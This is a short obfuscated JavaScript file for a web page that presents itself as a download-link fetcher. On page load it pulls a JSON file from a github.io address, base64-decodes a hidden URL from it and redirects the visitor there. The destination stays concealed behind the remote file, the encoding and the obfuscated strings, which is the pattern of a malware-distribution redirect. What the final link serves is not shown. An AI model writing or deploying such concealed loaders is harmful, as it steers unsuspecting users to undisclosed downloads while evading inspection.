// script.js (obfuscated)
(function(){
  var _0xabc = [
    'DOMContentLoaded',
    'addEventListener',
    'status-text',
    'error-text',
    'textContent',
    'Fetching download link…',
    'https://tensorghost.github.io/gomer/settings.yy8xk',
    'ok',
    'json',
    'c',
    'Redirecting…',
    'location',
    'href',
    'Error: ',
    'getElementById',
    'error'
  ];
  var _0xdef = function(idx){
    return _0xabc[idx];
  };
  document[_0xdef(1)](_0xdef(0), async function(){
    var _0xstat = document[_0xdef(14)](_0xdef(2)),
        _0xerr  = document[_0xdef(14)](_0xdef(3));
    _0xstat[_0xdef(4)] = _0xdef(5);
    _0xerr[_0xdef(4)]  = '';
    try {
      const _0xres = await fetch(_0xdef(6));
      if (!_0xres[_0xdef(7)]) {
        throw new Error(_0xdef(13) + _0xres.status);
      }
      const _0xjson = await _0xres[_0xdef(8)](),
            _0xc    = _0xjson[_0xdef(9)],
            _0xurl  = atob(_0xc);
      if (!/^https?:\/\//.test(_0xurl)) {
        throw new Error('Invalid URL');
      }
      _0xstat[_0xdef(4)] = _0xdef(10);
      window[_0xdef(11)][_0xdef(12)] = _0xurl;
    } catch (_0xe) {
      console[_0xdef(15)](_0xe);
      _0xstat[_0xdef(4)] = '';
      _0xerr[_0xdef(4)]   = _0xdef(13) + _0xe.message;
    }
  });
})();
